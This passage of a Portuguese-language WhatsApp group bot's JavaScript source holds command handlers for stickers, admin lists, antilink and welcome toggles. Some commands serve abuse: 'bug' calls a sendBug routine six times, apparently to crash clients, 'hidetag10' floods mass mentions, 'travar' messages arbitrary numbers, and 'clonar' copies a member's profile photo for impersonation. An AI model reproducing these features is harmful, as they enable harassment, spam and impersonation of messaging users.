if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
teks = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
break
case 'linkgp':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
linkgc = await tomioka.groupInviteCode(from)
enviar('https://chat.whatsapp.com/'+linkgc)
break
case 'leave':
if (!isGroup) return enviar ('só grupo')
if (isGroupAdmins || isOwner) {
tomioka.groupLeave(from)
} else {
enviar('só adm')
}
break
case 'notif':
if (!isOwner) return enviar('só dono')
if (!isGroup) return enviar('Só em grupo')
teks = `Notificação de @${sender.split("@")[0]}\n*Mensagem : ${body.slice(7)}*`
group = await tomioka.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {
mentionedJid: jids
},
quoted: tomio, contextInfo: tome
}
await tomioka.sendMessage(from, options, text)
break
case 'togif': 
if (!isQuotedSticker) return enviar(` Você precisa marcar um sticker animado para isso`)
if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const mediaaa = await tomioka.downloadAndSaveMediaMessage(encmediaaa)
enviar('espere ')
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: tomio, caption: 'ta ai'})
fs.unlinkSync(mediaaa)
}
break
        case 'toimg':
                if (!isQuotedSticker) return enviar('Por favor, marque uma sticker')
qwe = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated
if (qwe == true) return enviar('Só sticker parada amigo')
                enviar('espere')
                encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                media = await tomioka.downloadAndSaveMediaMessage(encmedia)
                ran = getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                        fs.unlinkSync(media)
                        if (err) return enviar('Erro parça, faz de novo ae')
                        buffer = fs.readFileSync(ran)
                        tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, thumbnail: fs.readFileSync('./me.jpg'), caption: 'ta ai'})
                        fs.unlinkSync(ran)
                })
                break

break
case 'simi':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar ('Onde está o texto?')
teks = body.slice(5)
anu = await simih(teks) //fetchJson(`https://api.zeks.xyz/api/simi?apikey=TioTomioka&text=P'})
//if (anu.error) return enviar ('Simi ga tau kak')
enviar(anu)
break
case 'simih':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (args.length < 1) return enviar ('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return enviar ('O modo Simi está ativo')
samih.push(from)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
enviar('✓Ativado com sucesso o modo simi neste grupo✓')
} else if (Number(args[0]) === 0) {
samih.splice(from, 1)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
enviar('×Desativado modo simi com sucesso neste grupo×')
} else {
enviar('1 para ativar, 0 para desativar')
}
break
case 'chat':
if (args[0].startsWith('08')) return enviar('Coloque o codigo do país 55 🇧🇷')
if (args[0].startsWith('+55')) return enviar('Coloque o codigo do país so pode +55 🇧🇷')
if (args.length < 1) return enviar(`Use assim ${prefix +command} 55xnxx|texto`)
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var org = pc.split("|")[1];
tomioka.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
enviar(`Conversa enviada com sucesso:\n${org},@${nomor}`)
break
case 'bug':
if (!isOwner) return
try {
quotedText = tomioka.message.extendedTextMessage.contextInfo.quotedMessage.conversation
sendBug(from, `${quotedText}`)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
} catch {
sendBug(from)
}
break
case 'travar':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (args[0].startsWith('08')) return enviar('Coloque o codigo do país 55 🇧🇷')
if (args[0].startsWith('+55')) return enviar('Coloque o codigo do país so pode +55 🇧🇷')
if (args.length < 1) return enviar(`Use assim ${prefix +command} 55xnxx|texto`)
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var org = 'teste'
tomioka.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
enviar(`Conversa enviada com sucesso:\n${org},@${nomor}`)
break

case 'bemvindo': 
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroupAdmins) return enviar ('só adm')
if (!isGroup) return enviar ('só grupo')
if (args.length < 1) return enviar ('ativar 1, desativar 0')
if (args[0] === '1') {
if (isWelkom) return enviar ('「 ❗ 」recurso de bem vindo ativado✔️')
welkom.push(from)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
enviar('「 ❗ 」recurso de bem vindo ativado✔️')
}
//Encontrar a posição do grupo no arquivo json
if (args[0] === '0') {
let position = false
Object.keys(welkom).forEach((i) => {
if (welkom[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posição já está definida 
if (position !== undefined) {
welkom.splice(position, 1)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
enviar('「 ❗ 」recurso de bem vindo desativado✔️')
}}
break

case 'antilink':
if (!isGroup) return enviar('Só em grupo.')
if (!isGroupAdmins) return enviar('Você precisa ser adm')
if (!isBotGroupAdmins) return enviar('O bot precisa ser adm')
if (args.length < 1) return enviar('Digite 1 para ativar\nDigite 0 para desativar')
if (Number(args[0]) === 1) {
if (isAntiLink) return enviar('*RECURSOS ANTILINK ESTÁ ATIVO*')
antilink.push(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*「 ❗ 」recurso de antilink ativado✔️*')
tomioka.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
} else if (Number(args[0]) === 0) {
if (!isAntiLink) return enviar('*Já está desativado!!*')
antilink.splice(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*「 ❗ 」recurso de antilink desativado✔️*')
} else {
enviar('1 para ativar, 0 para desativar')
}
break
//botao antilink 
case 'antilink1':
if (!isGroup) return enviar('Só em grupo.')
if (!isGroupAdmins) return enviar('Você precisa ser adm')
if (!isBotGroupAdmins) return enviar('O bot precisa ser adm')
if (isAntiLink) return enviar('*RECURSOS ANTILINK ESTÁ ATIVO*')
antilink.push(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*「 ❗ 」recurso de antilink ativado✔️*')
tomioka.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)

case 'antilink0':
if (!isAntiLink) return enviar('*Já está desativado!!*')
antilink.splice(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*「 ❗ 」recurso de antilink desativado✔️*')

break

case 'clonar':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isOwner) return enviar (mess.only.ownerB)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (args.length < 1) return enviar ('Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('Tag cvk')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await tomioka.getProfilePicture(id)
buffer = await getBuffer(pp)
tomioka.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [jid], true)
} catch (e) {
enviar('Putz, deu erro, a pessoa deve estar sem foto 😔')
}
break
case 'antidel':
if (args[0] == '1') {

antidel = true

enviar(`[📌] ${command} ativado com sucesso`)

} else if (args[0] == '0') {

antidel = false

enviar(`[📌] ${command} desativado com sucesso`)

}


break
case 'hidetag':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isadminbot) return enviar ('Quem é Você?')
var value = body.slice(9)
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: msg
}
tomioka.sendMessage(from, options, text)
break
case 'hidetag10':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isadminbot) return enviar ('Quem é Você?')
var value = body.slice(10)
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: msg
}
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
break
//
case 'setpp3':
if (!isGroup) return enviar ('só grupo')
if (!isfrendsowner) return enviar ('Quem é Você?')
if (!isBotGroupAdmins) return enviar (omess.nly.Badmin)
media = await tomioka.downloadAndSaveMediaMessage(msg)
await tomioka.updateProfilePicture (from, media)
enviar('Alterado com sucesso o ícone do Grupo')
break
case 'wait':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
media = await tomioka.downloadMediaMessage(encmedia)
await wait(media).then(res => {
tomioka.sendMessage(from, res.video, video, {quoted: msg, caption: res.teks.trim()})
}).catch(err => {
enviar(err)
})
} else {
enviar('Só uma foto mano')
}
default:
/*if (body == `${prefix}${command}`) {
tesf = `
╭────── • ◆ • ──────
│    └ NÃO ENCONTRADO ┘
│${command} não existe❗
│ NICK : ${pushname}      
│ NÚMERO : @${sender.split("@")[0]}
│ DIGITE : ${prefix}menu para saber mais
╰────── • ◆ • ──────`
enviar(tesf)
}*/

}} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})
}
starts()
